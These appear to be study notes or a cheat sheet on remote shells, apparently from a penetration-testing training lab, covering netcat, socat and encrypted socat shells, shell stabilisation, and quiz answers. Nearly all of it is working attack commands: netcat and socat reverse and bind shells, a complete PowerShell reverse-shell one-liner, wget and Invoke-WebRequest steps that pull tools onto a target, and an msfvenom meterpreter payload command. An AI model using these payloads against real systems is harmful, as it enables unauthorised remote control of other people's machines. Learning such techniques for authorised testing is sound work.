###	Type of Shell

####	`Reverse Shell`
On the attacking machine:
`sudo nc -lvnp 443`

On the target:
`nc <LOCAL-IP> <PORT> -e /bin/bash`

####	`Bind Shell`
On the target:
`nc -lvnp <port> -e "cmd.exe"`

On the attacking machine:
`nc MACHINE_IP <port>`

###	Netcat Stabilisation

-	Technique 1: Python
```
1.The first thing to do is use python -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.

2.Step two is: export TERM=xterm -- this will give us access to term commands such as clear.

3.Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. 
```
-	Technique 2: rlwrap
```
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.

To use rlwrap, we invoke a slightly different listener:

rlwrap nc -lvnp <port>

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.
```

-	Technique 3: Socat
```
The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 
```
#### change terminal output after any technique above (for better ui)
```
First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:

Next, in your reverse/bind shell, type in:

stty rows <number>

and

stty cols <number>
```

###	Socat

Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

socat TCP-L:<port> -

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.

On Windows we would use this command to connect back:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

Bind Shells

On a Linux target we would use the following command:

socat TCP-L:<PORT> EXEC:"bash -li"

On a Windows target we would use this command for our listener:

socat TCP-L:<PORT> EXEC:powershell.exe,pipes

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

###	Socat Encrypted Shells
```
We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:

cat shell.key shell.crt > shell.pem

Now, when we set up our reverse shell listener, we use:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

The same technique would apply for a bind shell:

Target:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

```
###	Common Shell payloads
-	What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0,FILE:`tty`,raw,echo=0
```

-	If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
```
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

####	When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

####	This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

###	msfvenom
What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443`
